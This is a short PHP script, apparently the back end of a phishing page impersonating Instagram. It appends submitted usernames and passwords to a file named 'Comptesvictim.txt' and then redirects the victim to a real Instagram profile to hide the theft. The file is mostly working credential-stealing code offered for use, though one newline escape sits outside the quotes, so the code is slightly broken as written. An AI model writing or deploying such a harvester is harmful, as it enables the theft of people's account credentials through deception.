<?php
 file_put_contents("Comptesvictim.txt","  Compte : " . $_POST['username'] . \n"  Mot de Pass : " .$_POST['password'] . "\n\n",FILE_APPEND);
 header('Location: https://www.instagram.com/thelinuxproject/?hl=fr');
 exit();
